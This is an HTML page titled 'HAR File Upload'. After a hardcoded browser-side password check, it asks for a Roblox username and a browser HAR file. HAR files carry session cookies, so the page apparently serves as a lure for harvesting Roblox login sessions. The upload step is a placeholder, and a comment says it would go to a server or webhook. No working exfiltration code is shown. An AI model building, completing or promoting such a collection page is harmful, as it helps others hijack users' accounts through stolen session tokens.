<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HAR File Upload</title>
  <style>
    body {
      background-color: #121212;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    #container {
      text-align: center;
      background: #1e1e1e;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px #000;
      width: 90%;
      max-width: 400px;
    }

    input[type="password"],
    input[type="text"],
    button {
      margin-top: 15px;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      width: 100%;
    }

    input[type="password"],
    input[type="text"] {
      background: #2c2c2c;
      color: white;
    }

    button {
      background-color: #3f51b5;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5c6bc0;
    }

    #upload-section {
      display: none;
      margin-top: 20px;
    }

    #drop-zone {
      border: 2px dashed #444;
      border-radius: 6px;
      padding: 20px;
      cursor: pointer;
      background-color: #2c2c2c;
      margin: 10px 0;
      transition: background-color 0.2s;
    }

    #drop-zone:hover {
      background-color: #3a3a3a;
    }

    #error-message {
      color: red;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div id="container">
    <div id="password-section">
      <h2>Enter password</h2>
      <input type="password" id="password-input" placeholder="Password"/>
      <button onclick="checkPassword()">Submit</button>
      <p id="error-message"></p>
    </div>

    <div id="upload-section">
      <h2>Upload HAR File</h2>
      <input type="text" id="username" placeholder="Roblox username" />
      <div id="drop-zone" ondragover="event.preventDefault()" ondrop="handleDrop(event)">
        <p>Drop HAR file here or click to select</p>
        <input type="file" id="har-file" accept=".har" hidden />
      </div>
      <button onclick="submitForm()">Submit</button>
    </div>
  </div>

  <script>
    const correctPassword = "EchoTrails2025";

    function checkPassword() {
      const input = document.getElementById("password-input").value;
      const errorMsg = document.getElementById("error-message");

      if (input === correctPassword) {
        document.getElementById("password-section").style.display = "none";
        document.getElementById("upload-section").style.display = "block";
        errorMsg.textContent = "";
      } else {
        errorMsg.textContent = "Incorrect password. Try again.";
      }
    }

    const dropZone = document.getElementById("drop-zone");
    const harInput = document.getElementById("har-file");

    dropZone.addEventListener("click", () => harInput.click());

    function handleDrop(event) {
      event.preventDefault();
      const file = event.dataTransfer.files[0];
      if (file && file.name.endsWith(".har")) {
        harInput.files = event.dataTransfer.files;
        dropZone.innerHTML = `<p>Selected: ${file.name}</p>`;
      } else {
        alert("Please upload a .har file.");
      }
    }

    harInput.addEventListener("change", () => {
      if (harInput.files.length > 0) {
        dropZone.innerHTML = `<p>Selected: ${harInput.files[0].name}</p>`;
      }
    });

    function submitForm() {
      const username = document.getElementById("username").value;
      const file = document.getElementById("har-file").files[0];

      if (!username || !file) {
        alert("Please enter a username and select a .har file.");
        return;
      }

      // Placeholder for submission logic (e.g., upload to server or webhook)
      alert(`Uploading HAR file for user: ${username}`);
    }
  </script>
</body>
</html>
